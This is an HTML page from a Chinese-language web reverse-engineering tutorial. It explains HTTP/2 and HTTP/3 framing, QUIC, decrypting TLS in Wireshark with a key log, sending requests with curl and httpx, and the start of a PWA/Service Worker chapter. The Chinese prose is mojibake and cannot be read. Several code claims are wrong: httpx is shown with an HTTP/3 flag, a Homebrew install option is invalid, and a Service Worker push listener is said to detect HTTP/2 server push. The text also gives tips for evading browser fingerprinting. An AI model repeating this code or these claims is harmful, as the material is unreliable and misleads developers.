<p><strong>åŸç†</strong>: ä½¿ç”¨ <code>WINDOW_UPDATE</code> å¸§æ§åˆ¶å‘é€é€Ÿç‡</p>
<p><strong>åœºæ™¯</strong>: é˜²æ­¢å¿«é€Ÿå‘é€æ–¹å‹å®æ…¢é€Ÿæ¥æ”¶æ–¹</p>
<pre><code>å‘é€æ–¹                æ¥æ”¶æ–¹
  |                      |
  |---- DATA (16KB) ----&gt;|
  |                      | (ç¼“å†²åŒºæ»¡)
  |&lt;-- WINDOW_UPDATE ---|  (é€šçŸ¥å¯æ¥æ”¶)
  |---- DATA (16KB) ----&gt;|
</code></pre>
<hr />
<h3>2.2 HTTP/2 æŠ“åŒ…ä¸åˆ†æ</h3>
<h4>ä½¿ç”¨ Wireshark åˆ†æ HTTP/2</h4>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li><strong>å¯åŠ¨æŠ“åŒ…</strong>: æ•è· HTTPS æµé‡</li>
<li><strong>è§£å¯† TLS</strong>: è®¾ç½® SSL/TLS è§£å¯†ï¼ˆéœ€è¦ç§é’¥æˆ–æµè§ˆå™¨å¯†é’¥æ—¥å¿—ï¼‰</li>
<li><strong>è¿‡æ»¤ HTTP/2</strong>: ä½¿ç”¨è¿‡æ»¤å™¨ <code>http2</code></li>
</ol>
<p><strong>Chrome å¯¼å‡ºå¯†é’¥æ—¥å¿—</strong>:</p>
<pre><code class="language-bash"># macOS/Linux
export SSLKEYLOGFILE=~/sslkeys.log
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Windows
set SSLKEYLOGFILE=C:\sslkeys.log
&quot;C:\Program Files\Google\Chrome\Application\chrome.exe&quot;
</code></pre>
<p><strong>Wireshark é…ç½®</strong>:</p>
<ol>
<li><code>Edit</code> â†’ <code>Preferences</code> â†’ <code>Protocols</code> â†’ <code>TLS</code></li>
<li><code>(Pre)-Master-Secret log filename</code>: é€‰æ‹© <code>sslkeys.log</code></li>
<li>é‡å¯ Wireshark</li>
</ol>
<p><strong>åˆ†æ HTTP/2 å¸§</strong>:</p>
<pre><code>Frame 123: HEADERS
  Stream ID: 3
  :method: GET
  :path: /api/data
  :authority: example.com

Frame 125: DATA
  Stream ID: 3
  Data Length: 1024
  Payload: {&quot;result&quot;: ...}
</code></pre>
<hr />
<h4>ä½¿ç”¨ Chrome DevTools</h4>
<p><strong>æŸ¥çœ‹ HTTP/2 åè®®</strong>:</p>
<ol>
<li>Network é¢æ¿ â†’ å³é”®è¡¨å¤´ â†’ å‹¾é€‰ &quot;Protocol&quot;</li>
<li>çœ‹åˆ° <code>h2</code> è¡¨ç¤º HTTP/2</li>
</ol>
<p><strong>æŸ¥çœ‹å¸§è¯¦æƒ…</strong> (å®éªŒæ€§):</p>
<ol>
<li><code>chrome://net-internals/#http2</code></li>
<li>æŸ¥çœ‹æ´»è·ƒçš„ HTTP/2 ä¼šè¯å’Œæµ</li>
</ol>
<hr />
<h3>2.3 HTTP/2 é€†å‘å®æˆ˜</h3>
<h4>æ¡ˆä¾‹: å¤ç° HTTP/2 è¯·æ±‚</h4>
<p><strong>é—®é¢˜</strong>: <code>curl</code> é»˜è®¤ä½¿ç”¨ HTTP/1.1</p>
<p><strong>è§£å†³</strong>: ä½¿ç”¨ <code>curl</code> çš„ HTTP/2 æ”¯æŒ</p>
<pre><code class="language-bash"># å¼ºåˆ¶ä½¿ç”¨ HTTP/2
curl --http2 https://example.com/api/data

# æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯
curl --http2 -v https://example.com/api/data

# è¾“å‡ºç¤ºä¾‹
* Using HTTP2, server supports multi-use
* Connection state changed (HTTP/2 confirmed)
* Using Stream ID: 1 (easy handle 0x7f9c8c004000)
&gt; GET /api/data HTTP/2
&gt; Host: example.com
&gt; User-Agent: curl/7.79.1
</code></pre>
<p><strong>Python è¯·æ±‚ (ä½¿ç”¨ httpx)</strong>:</p>
<pre><code class="language-python">import httpx

# httpx é»˜è®¤æ”¯æŒ HTTP/2
async with httpx.AsyncClient(http2=True) as client:
    response = await client.get('https://example.com/api/data')
    print(f&quot;HTTPç‰ˆæœ¬: {response.http_version}&quot;)  # HTTP/2
    print(response.json())
</code></pre>
<hr />
<h4>æ¡ˆä¾‹: è¯†åˆ«æœåŠ¡å™¨æ¨é€</h4>
<p><strong>åœ¨ Chrome DevTools ä¸­</strong>:</p>
<ul>
<li>Initiator åˆ—æ˜¾ç¤º &quot;Push / Other&quot;</li>
<li>Protocol åˆ—æ˜¾ç¤º <code>h2</code></li>
</ul>
<p><strong>åœ¨ä»£ç ä¸­æ£€æµ‹</strong>:</p>
<pre><code class="language-javascript">// Service Worker ä¸­æ‹¦æˆªæœåŠ¡å™¨æ¨é€
self.addEventListener(&quot;push&quot;, function (event) {
  console.log(&quot;Received server push:&quot;, event);
});

// æ€§èƒ½ API æ£€æµ‹
performance.getEntriesByType(&quot;navigation&quot;).forEach((entry) =&gt; {
  if (entry.nextHopProtocol === &quot;h2&quot;) {
    console.log(&quot;ä½¿ç”¨ HTTP/2&quot;);
  }
});
</code></pre>
<hr />
<h2>3. HTTP/3 è¯¦è§£</h2>
<h3>3.1 æ ¸å¿ƒç‰¹æ€§</h3>
<h4>3.1.1 åŸºäº QUIC åè®®</h4>
<p><strong>QUIC (Quick UDP Internet Connections)</strong>:</p>
<ul>
<li>åŸºäº <strong>UDP</strong> è€Œé TCP</li>
<li>å†…ç½® TLS 1.3 åŠ å¯†</li>
<li>ç”± Google å¼€å‘ï¼Œåæ ‡å‡†åŒ–ä¸º IETF QUIC</li>
</ul>
<p><strong>åè®®æ ˆå¯¹æ¯”</strong>:</p>
<pre><code>HTTP/1.1               HTTP/2                 HTTP/3
--------               ------                 ------
HTTP                   HTTP/2                 HTTP/3
TCP                    TCP                    QUIC
TLS                    TLS                    (å†…ç½® TLS 1.3)
IP                     IP                     UDP
                                             IP
</code></pre>
<hr />
<h4>3.1.2 0-RTT è¿æ¥å»ºç«‹</h4>
<p><strong>TCP + TLS 1.2</strong> (HTTP/1.1, HTTP/2):</p>
<pre><code>å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: SYN                       (1 RTT)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: SYN-ACK
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: ACK

å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: ClientHello               (2 RTT)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: ServerHello, Certificate
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: Finished

å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: HTTP Request              (3 RTT)
</code></pre>
<p><strong>QUIC</strong> (HTTP/3):</p>
<pre><code>é¦–æ¬¡è¿æ¥:
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: Initial Packet (å« ClientHello)  (1 RTT)
æœåŠ¡å™¨ -&gt; å®¢æˆ·ç«¯: Handshake Packet
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: HTTP Request                     (1 RTT å®Œæˆ)

åç»­è¿æ¥ (0-RTT):
å®¢æˆ·ç«¯ -&gt; æœåŠ¡å™¨: 0-RTT Packet (å«åŠ å¯†çš„ HTTP è¯·æ±‚)  (0 RTT!)
</code></pre>
<p><strong>æ€§èƒ½æå‡</strong>: å¯å‡å°‘ 66% çš„æ¡æ‰‹å»¶è¿Ÿ</p>
<hr />
<h4>3.1.3 æ¶ˆé™¤é˜Ÿå¤´é˜»å¡</h4>
<p><strong>HTTP/2 çš„é—®é¢˜</strong>: TCP å±‚é¢ä»æœ‰é˜Ÿå¤´é˜»å¡</p>
<pre><code>TCP è¿æ¥
|
â”œâ”€â”€ Stream 1: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ä¸¢åŒ…!) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
â”œâ”€â”€ Stream 3: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ç­‰å¾…) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
â””â”€â”€ Stream 5: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ç­‰å¾…) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
</code></pre>
<p>å½“ TCP ä¸¢åŒ…æ—¶ï¼Œæ‰€æœ‰ HTTP/2 æµéƒ½ä¼šè¢«é˜»å¡ï¼Œç›´åˆ°é‡ä¼ å®Œæˆã€‚</p>
<p><strong>HTTP/3 çš„è§£å†³</strong>: QUIC ç‹¬ç«‹æµ</p>
<pre><code>QUIC è¿æ¥
|
â”œâ”€â”€ Stream 1: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ä¸¢åŒ…!) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
â”œâ”€â”€ Stream 3: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ç»§ç»­ä¼ è¾“) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
â””â”€â”€ Stream 5: â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ (ç»§ç»­ä¼ è¾“) â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ
</code></pre>
<p>æ¯ä¸ª QUIC æµç‹¬ç«‹ï¼Œä¸¢åŒ…åªå½±å“å½“å‰æµã€‚</p>
<hr />
<h4>3.1.4 è¿æ¥è¿ç§» (Connection Migration)</h4>
<p><strong>åœºæ™¯</strong>: ç§»åŠ¨è®¾å¤‡ä» WiFi åˆ‡æ¢åˆ° 4G</p>
<p><strong>TCP/HTTP/2</strong>: è¿æ¥æ–­å¼€ï¼Œéœ€è¦é‡æ–°å»ºç«‹</p>
<pre><code>WiFi (IP: 192.168.1.10) ----X----&gt; åˆ‡æ¢åˆ° 4G (IP: 10.0.0.5)
éœ€è¦é‡æ–°ä¸‰æ¬¡æ¡æ‰‹ + TLS æ¡æ‰‹ + HTTP/2 å»ºç«‹
</code></pre>
<p><strong>QUIC/HTTP/3</strong>: è¿æ¥ä¿æŒ</p>
<pre><code>WiFi (è¿æ¥ ID: abc123) -----&gt; åˆ‡æ¢åˆ° 4G (è¿æ¥ ID: abc123)
é€šè¿‡è¿æ¥ ID è¯†åˆ«ï¼Œæ— éœ€é‡æ–°æ¡æ‰‹
</code></pre>
<p><strong>ä¼˜åŠ¿</strong>:</p>
<ul>
<li>ç§»åŠ¨ç½‘ç»œåˆ‡æ¢æ— æ„ŸçŸ¥</li>
<li>è§†é¢‘æ’­æ”¾ã€ä¸‹è½½ä¸ä¸­æ–­</li>
</ul>
<hr />
<h3>3.2 HTTP/3 æŠ“åŒ…ä¸åˆ†æ</h3>
<h4>Wireshark æŠ“åŒ… HTTP/3</h4>
<p><strong>æ­¥éª¤</strong>:</p>
<ol>
<li><strong>æ•è· UDP æµé‡</strong>: HTTP/3 ä½¿ç”¨ UDP ç«¯å£ï¼ˆé€šå¸¸ 443ï¼‰</li>
<li><strong>è§£å¯† QUIC</strong>: éœ€è¦ QUIC å¯†é’¥æ—¥å¿—</li>
</ol>
<p><strong>Chrome å¯¼å‡º QUIC å¯†é’¥</strong>:</p>
<pre><code class="language-bash">export SSLKEYLOGFILE=~/sslkeys.log
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --enable-quic
</code></pre>
<p><strong>Wireshark è¿‡æ»¤å™¨</strong>:</p>
<pre><code>quic
http3
</code></pre>
<hr />
<h4>Chrome æŸ¥çœ‹ HTTP/3</h4>
<p><strong>æ£€æµ‹æ–¹æ³•</strong>:</p>
<ol>
<li><strong>Network é¢æ¿</strong>: Protocol åˆ—æ˜¾ç¤º <code>h3</code> æˆ– <code>h3-29</code></li>
<li><strong>chrome://net-internals/#quic</strong>: æŸ¥çœ‹ QUIC ä¼šè¯è¯¦æƒ…</li>
<li><strong>å¼€å‘è€…å·¥å…·</strong>: åœ¨ Network é¢æ¿çš„ Protocol åˆ—æŸ¥çœ‹</li>
</ol>
<p><strong>JavaScript æ£€æµ‹</strong>:</p>
<pre><code class="language-javascript">// æ£€æµ‹ HTTP ç‰ˆæœ¬
fetch(&quot;https://example.com/api/data&quot;).then((response) =&gt; {
  console.log(response.headers.get(&quot;alt-svc&quot;));
  // è¾“å‡º: h3=&quot;:443&quot;; ma=2592000
});

// Performance API
performance.getEntriesByType(&quot;resource&quot;).forEach((entry) =&gt; {
  console.log(entry.nextHopProtocol); // h3, h2, http/1.1
});
</code></pre>
<hr />
<h3>3.3 HTTP/3 é€†å‘å®æˆ˜</h3>
<h4>æ¡ˆä¾‹: ä½¿ç”¨ curl å‘é€ HTTP/3 è¯·æ±‚</h4>
<p><strong>å®‰è£…æ”¯æŒ HTTP/3 çš„ curl</strong> (éœ€è¦ç¼–è¯‘):</p>
<pre><code class="language-bash"># macOS (ä½¿ç”¨ Homebrew)
brew install curl --with-nghttp3

# æ£€æŸ¥ç‰ˆæœ¬
curl --version
# Features: ... HTTP3 ...
</code></pre>
<p><strong>å‘é€è¯·æ±‚</strong>:</p>
<pre><code class="language-bash"># å¼ºåˆ¶ä½¿ç”¨ HTTP/3
curl --http3 https://cloudflare-quic.com/

# æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯
curl --http3 -v https://cloudflare-quic.com/
# * Using HTTP/3 Stream ID: 0 (easy handle 0x...)
# &gt; GET / HTTP/3
# &gt; Host: cloudflare-quic.com
</code></pre>
<hr />
<h4>æ¡ˆä¾‹: Python ä½¿ç”¨ HTTP/3</h4>
<p><strong>ä½¿ç”¨ httpx</strong> (å®éªŒæ€§æ”¯æŒ):</p>
<pre><code class="language-python">import httpx

# éœ€è¦å®‰è£… HTTP/3 æ”¯æŒ
# pip install httpx[http3]

async with httpx.AsyncClient(http3=True) as client:
    response = await client.get('https://cloudflare-quic.com/')
    print(f&quot;HTTPç‰ˆæœ¬: {response.http_version}&quot;)  # HTTP/3
    print(response.text)
</code></pre>
<hr />
<h2>4. ç‰ˆæœ¬å¯¹æ¯”æ€»ç»“</h2>
<table>
<thead>
<tr>
  <th>ç‰¹æ€§</th>
  <th>HTTP/1.1</th>
  <th>HTTP/2</th>
  <th>HTTP/3</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>åè®®ç±»å‹</strong></td>
  <td>æ–‡æœ¬</td>
  <td>äºŒè¿›åˆ¶</td>
  <td>äºŒè¿›åˆ¶</td>
</tr>
<tr>
  <td><strong>ä¼ è¾“å±‚</strong></td>
  <td>TCP</td>
  <td>TCP</td>
  <td>UDP (QUIC)</td>
</tr>
<tr>
  <td><strong>åŠ å¯†</strong></td>
  <td>å¯é€‰ (HTTPS)</td>
  <td>å¼ºåˆ¶ TLS</td>
  <td>å†…ç½® TLS 1.3</td>
</tr>
<tr>
  <td><strong>å¤šè·¯å¤ç”¨</strong></td>
  <td>âŒ</td>
  <td>âœ…</td>
  <td>âœ…</td>
</tr>
<tr>
  <td><strong>é˜Ÿå¤´é˜»å¡</strong></td>
  <td>ä¸¥é‡</td>
  <td>TCP å±‚</td>
  <td>æ— </td>
</tr>
<tr>
  <td><strong>å¤´éƒ¨å‹ç¼©</strong></td>
  <td>âŒ</td>
  <td>HPACK</td>
  <td>QPACK</td>
</tr>
<tr>
  <td><strong>æœåŠ¡å™¨æ¨é€</strong></td>
  <td>âŒ</td>
  <td>âœ…</td>
  <td>âœ…</td>
</tr>
<tr>
  <td><strong>è¿æ¥å»ºç«‹</strong></td>
  <td>3 RTT (TCP+TLS)</td>
  <td>3 RTT</td>
  <td>1 RTT (0-RTT å¯ç”¨)</td>
</tr>
<tr>
  <td><strong>è¿æ¥è¿ç§»</strong></td>
  <td>âŒ</td>
  <td>âŒ</td>
  <td>âœ…</td>
</tr>
<tr>
  <td><strong>æµè§ˆå™¨æ”¯æŒ</strong></td>
  <td>100%</td>
  <td>97%+</td>
  <td>75%+ (å¢é•¿ä¸­)</td>
</tr>
</tbody>
</table>
<hr />
<h2>5. é€†å‘å·¥ç¨‹æ³¨æ„äº‹é¡¹</h2>
<h3>5.1 åè®®åå•† (ALPN)</h3>
<p>æœåŠ¡å™¨é€šè¿‡ <strong>ALPN (Application-Layer Protocol Negotiation)</strong> å‘ŠçŸ¥å®¢æˆ·ç«¯æ”¯æŒçš„åè®®ã€‚</p>
<p><strong>TLS æ¡æ‰‹ä¸­çš„ ALPN</strong>:</p>
<pre><code>ClientHello:
  ALPN Extension: [h2, http/1.1]

ServerHello:
  ALPN Extension: h2
</code></pre>
<p><strong>HTTP/3 åå•†</strong> (é€šè¿‡ Alt-Svc å¤´):</p>
<pre><code class="language-http">HTTP/2 200 OK
Alt-Svc: h3=&quot;:443&quot;; ma=2592000

# ma = max-age (ç¼“å­˜æ—¶é—´)
</code></pre>
<p>å®¢æˆ·ç«¯æ”¶åˆ°åï¼Œåç»­è¯·æ±‚ä¼šå°è¯•ä½¿ç”¨ HTTP/3ã€‚</p>
<hr />
<h3>5.2 æŠ“åŒ…å·¥å…·é€‰æ‹©</h3>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>HTTP/1.1</th>
  <th>HTTP/2</th>
  <th>HTTP/3</th>
  <th>å¤‡æ³¨</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Wireshark</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>éœ€è¦é…ç½®è§£å¯†</td>
</tr>
<tr>
  <td><strong>Chrome DevTools</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>æœ€æ–¹ä¾¿</td>
</tr>
<tr>
  <td><strong>Burp Suite</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âŒ</td>
  <td>ä¸æ”¯æŒ HTTP/3</td>
</tr>
<tr>
  <td><strong>Charles Proxy</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âŒ</td>
  <td>ä¸æ”¯æŒ HTTP/3</td>
</tr>
<tr>
  <td><strong>mitmproxy</strong></td>
  <td>âœ…</td>
  <td>âœ…</td>
  <td>âš ï¸</td>
  <td>å®éªŒæ€§æ”¯æŒ</td>
</tr>
</tbody>
</table>
<p><strong>æ³¨æ„</strong>: å¤§éƒ¨åˆ† MITM ä»£ç†å·¥å…·ä¸æ”¯æŒ HTTP/3ï¼Œå› ä¸º QUIC éš¾ä»¥ä¸­é—´äººæ”»å‡»ã€‚</p>
<hr />
<h3>5.3 è‡ªåŠ¨åŒ–å·¥å…·å…¼å®¹æ€§</h3>
<h4>Puppeteer / Playwright</h4>
<pre><code class="language-javascript">// é»˜è®¤æ”¯æŒ HTTP/2 å’Œ HTTP/3
const browser = await puppeteer.launch();
const page = await browser.newPage();

await page.goto(&quot;https://cloudflare-quic.com/&quot;);

// æ£€æµ‹åè®®ç‰ˆæœ¬
const protocol = await page.evaluate(() =&gt; {
  return performance.getEntriesByType(&quot;navigation&quot;)[0].nextHopProtocol;
});

console.log(`ä½¿ç”¨åè®®: ${protocol}`); // h2 æˆ– h3
</code></pre>
<h4>Requests (Python)</h4>
<pre><code class="language-python">import requests

# requests é»˜è®¤åªæ”¯æŒ HTTP/1.1
# éœ€è¦ä½¿ç”¨ httpx æˆ– urllib3 çš„æ–°ç‰ˆæœ¬

import httpx

async with httpx.AsyncClient(http2=True) as client:
    response = await client.get('https://example.com/')
    print(response.http_version)  # HTTP/2
</code></pre>
<hr />
<h3>5.4 TLS æŒ‡çº¹è¯†åˆ«</h3>
<p>HTTP/2 å’Œ HTTP/3 çš„ä½¿ç”¨ä¼šå½±å“ TLS æŒ‡çº¹ã€‚</p>
<p><strong>JA3 æŒ‡çº¹å·®å¼‚</strong>:</p>
<pre><code>HTTP/1.1 Client:
  ALPN: [http/1.1]

HTTP/2 Client:
  ALPN: [h2, http/1.1]

HTTP/3 Client:
  ALPN: [h3, h2, http/1.1]
</code></pre>
<p><strong>å¯¹æŠ—æ–¹æ³•</strong>: ä½¿ç”¨ <code>curl-impersonate</code> æˆ– <code>tls-client</code> åº“æ¨¡æ‹ŸçœŸå®æµè§ˆå™¨æŒ‡çº¹ã€‚</p>
<hr />
<h2>6. æ€§èƒ½ä¼˜åŒ–å»ºè®®</h2>
<h3>6.1 é’ˆå¯¹ HTTP/2</h3>
<ol>
<li><strong>å‡å°‘åŸŸååˆ†ç‰‡</strong>: HTTP/2 ä¸éœ€è¦å¤šåŸŸåï¼Œåè€Œæœ‰å®³</li>
<li><strong>é¿å…å†…è”èµ„æº</strong>: HTTP/2 çš„å¤šè·¯å¤ç”¨ä½¿ç‹¬ç«‹æ–‡ä»¶æ›´é«˜æ•ˆ</li>
<li><strong>ä½¿ç”¨æœåŠ¡å™¨æ¨é€</strong>: é¢„æ¨é€å…³é”® CSS/JS</li>
<li><strong>åˆç†è®¾ç½®ä¼˜å…ˆçº§</strong>: æ ‡è®°å…³é”®èµ„æºçš„ä¼˜å…ˆçº§</li>
</ol>
<hr />
<h3>6.2 é’ˆå¯¹ HTTP/3</h3>
<ol>
<li><strong>å¯ç”¨ 0-RTT</strong>: å‡å°‘é‡å¤è®¿é—®çš„å»¶è¿Ÿ</li>
<li><strong>ä¼˜åŒ– UDP</strong>: ç¡®ä¿é˜²ç«å¢™ä¸é˜»æ­¢ UDP 443</li>
<li><strong>é™çº§ç­–ç•¥</strong>: åœ¨ HTTP/3 å¤±è´¥æ—¶é™çº§åˆ° HTTP/2</li>
</ol>
<hr />
<h2>7. å¸¸è§é—®é¢˜</h2>
<h3>Q1: å¦‚ä½•å¼ºåˆ¶ä½¿ç”¨ç‰¹å®šçš„ HTTP ç‰ˆæœ¬ï¼Ÿ</h3>
<p><strong>Chrome</strong>:</p>
<pre><code class="language-bash"># ç¦ç”¨ HTTP/2
chrome --disable-http2

# ç¦ç”¨ QUIC (HTTP/3)
chrome --disable-quic
</code></pre>
<p><strong>curl</strong>:</p>
<pre><code class="language-bash">curl --http1.1 https://example.com/  # å¼ºåˆ¶ HTTP/1.1
curl --http2 https://example.com/    # å¼ºåˆ¶ HTTP/2
curl --http3 https://example.com/    # å¼ºåˆ¶ HTTP/3
</code></pre>
<hr />
<h3>Q2: Burp Suite æ— æ³•æŠ“å– HTTP/3 æµé‡æ€ä¹ˆåŠï¼Ÿ</h3>
<p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>
<ol>
<li><strong>ç¦ç”¨ HTTP/3</strong>: åœ¨æµè§ˆå™¨ä¸­ç¦ç”¨ QUIC<ul>
<li>Chrome: <code>chrome://flags/</code> æœç´¢ &quot;QUIC&quot;ï¼Œè®¾ä¸º Disabled</li>
</ul>
</li>
<li><strong>ä½¿ç”¨ Wireshark</strong>: Burp ä¸æ”¯æŒ HTTP/3ï¼Œä½¿ç”¨ Wireshark æŠ“åŒ…</li>
<li><strong>æœåŠ¡å™¨é™çº§</strong>: åˆ é™¤ <code>Alt-Svc</code> å¤´ï¼Œé˜»æ­¢å®¢æˆ·ç«¯å‡çº§åˆ° HTTP/3</li>
</ol>
<hr />
<h3>Q3: HTTP/2 æ˜¯å¦ä¼šæ³„éœ²æ›´å¤šæŒ‡çº¹ä¿¡æ¯ï¼Ÿ</h3>
<p><strong>æ˜¯çš„</strong>ï¼ŒHTTP/2 å¼•å…¥äº†æ–°çš„æŒ‡çº¹ç‚¹ï¼š</p>
<ul>
<li><strong>SETTINGS å¸§å‚æ•°</strong>: ä¸åŒå®¢æˆ·ç«¯çš„åˆå§‹è®¾ç½®ä¸åŒ</li>
<li><strong>ä¼˜å…ˆçº§æ ‘</strong>: è¯·æ±‚ä¼˜å…ˆçº§çš„è®¾ç½®æ–¹å¼</li>
<li><strong>æµ ID åˆ†é…</strong>: å¥‡å¶æ€§å’Œé¡ºåº</li>
</ul>
<p><strong>æ£€æµ‹ç¤ºä¾‹</strong>:</p>
<pre><code>Chrome:
  SETTINGS_HEADER_TABLE_SIZE: 65536
  SETTINGS_INITIAL_WINDOW_SIZE: 6291456

Firefox:
  SETTINGS_HEADER_TABLE_SIZE: 4096
  SETTINGS_INITIAL_WINDOW_SIZE: 65535
</code></pre>
<p><strong>å¯¹æŠ—</strong>: ä½¿ç”¨çœŸå®æµè§ˆå™¨è€Œéè„šæœ¬å·¥å…·ã€‚</p>
<hr />
<h2>8. å·¥å…·ä¸èµ„æº</h2>
<h3>æ¨èå·¥å…·</h3>
<table>
<thead>
<tr>
  <th>å·¥å…·</th>
  <th>ç”¨é€”</th>
  <th>é“¾æ¥</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>Wireshark</strong></td>
  <td>æŠ“åŒ…åˆ†æ</td>
  <td>https://www.wireshark.org/</td>
</tr>
<tr>
  <td><strong>httpx</strong></td>
  <td>Python HTTP/2/3 å®¢æˆ·ç«¯</td>
  <td>https://www.python-httpx.org/</td>
</tr>
<tr>
  <td><strong>curl</strong></td>
  <td>å‘½ä»¤è¡Œ HTTP å®¢æˆ·ç«¯</td>
  <td>https://curl.se/</td>
</tr>
<tr>
  <td><strong>h2spec</strong></td>
  <td>HTTP/2 åˆè§„æ€§æµ‹è¯•</td>
  <td>https://github.com/summerwind/h2spec</td>
</tr>
<tr>
  <td><strong>quic-go</strong></td>
  <td>Go è¯­è¨€ QUIC å®ç°</td>
  <td>https://github.com/quic-go/quic-go</td>
</tr>
</tbody>
</table>
<hr />
<h3>å­¦ä¹ èµ„æº</h3>
<ul>
<li><a href="https://datatracker.ietf.org/doc/html/rfc7540">HTTP/2 RFC 7540</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc9114">HTTP/3 RFC 9114</a></li>
<li><a href="https://datatracker.ietf.org/doc/html/rfc9000">QUIC RFC 9000</a></li>
<li><a href="https://http2-explained.haxx.se/zh">HTTP/2 Explained (ä¸­æ–‡)</a></li>
</ul>
<hr />
<h2>9. æ€»ç»“</h2>
<p>HTTP/2 å’Œ HTTP/3 æ˜¯ç°ä»£ Web çš„åŸºçŸ³ï¼Œç†è§£å®ƒä»¬å¯¹äºé€†å‘å·¥ç¨‹è‡³å…³é‡è¦ï¼š</p>
<p><strong>HTTP/2</strong>:</p>
<ul>
<li>âœ… å·²å¹¿æ³›éƒ¨ç½²ï¼Œå¿…é¡»æŒæ¡</li>
<li>âœ… å·¥å…·æ”¯æŒå®Œå–„</li>
<li>âš ï¸ TCP é˜Ÿå¤´é˜»å¡ä»å­˜åœ¨</li>
</ul>
<p><strong>HTTP/3</strong>:</p>
<ul>
<li>ğŸš€ æœªæ¥è¶‹åŠ¿ï¼Œé€æ­¥æ™®åŠ</li>
<li>ğŸ”’ æ›´å®‰å…¨ï¼ˆå†…ç½®åŠ å¯†ï¼‰</li>
<li>âš ï¸ å·¥å…·æ”¯æŒæœ‰é™</li>
</ul>
<p><strong>é€†å‘å»ºè®®</strong>:</p>
<ol>
<li>ä¼˜å…ˆä½¿ç”¨ Chrome DevTools åˆ†æ</li>
<li>HTTP/2 å¯ç”¨ Burp/Charlesï¼ŒHTTP/3 ç”¨ Wireshark</li>
<li>ä»£ç ä¸­ä½¿ç”¨ httpx æ”¯æŒæ–°åè®®</li>
<li>æ³¨æ„åè®®é™çº§å’Œå…¼å®¹æ€§</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-5">HTTP/HTTPS åè®®</a></li>
<li><a href="#section-13">TLS/SSL æ¡æ‰‹è¿‡ç¨‹</a></li>
<li><a href="#section-42">TLS æŒ‡çº¹è¯†åˆ«</a></li>
<li><a href="#section-19">Wireshark æŒ‡å—</a></li>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-44">
                                                <h2>[R43] PWA & Service Worker</h2>
                                                <h1>R43: PWA ä¸ Service Worker é€†å‘</h1>
<h2>æ¦‚è¿°</h2>
<p>æ¸è¿›å¼ Web åº”ç”¨ (Progressive Web Apps, PWA) å’Œ Service Worker æŠ€æœ¯ä½¿å¾— Web åº”ç”¨èƒ½å¤Ÿç¦»çº¿å·¥ä½œã€æ¥æ”¶æ¨é€é€šçŸ¥å¹¶æä¾›ç±»ä¼¼åŸç”Ÿåº”ç”¨çš„ä½“éªŒã€‚åœ¨é€†å‘å·¥ç¨‹ä¸­ï¼Œç†è§£ Service Worker çš„å·¥ä½œåŸç†å¯¹äºåˆ†æç°ä»£ Web åº”ç”¨ã€ç»•è¿‡ç¼“å­˜ç­–ç•¥å’Œç†è§£è¯·æ±‚æ‹¦æˆªæœºåˆ¶è‡³å…³é‡è¦ã€‚</p>
<hr />
<h2>åŸºç¡€æ¦‚å¿µ</h2>
<h3>å®šä¹‰</h3>
<p><strong>PWA (Progressive Web App)</strong> æ˜¯ä¸€ç§ä½¿ç”¨ç°ä»£ Web æŠ€æœ¯æ„å»ºçš„åº”ç”¨ï¼Œå…·æœ‰ç±»ä¼¼åŸç”Ÿåº”ç”¨çš„ä½“éªŒï¼š</p>
<ul>
<li>å¯å®‰è£…åˆ°ä¸»å±å¹•</li>
<li>ç¦»çº¿å·¥ä½œ</li>
<li>åå°åŒæ­¥</li>
<li>æ¨é€é€šçŸ¥</li>
<li>å¿«é€Ÿå“åº”</li>
</ul>
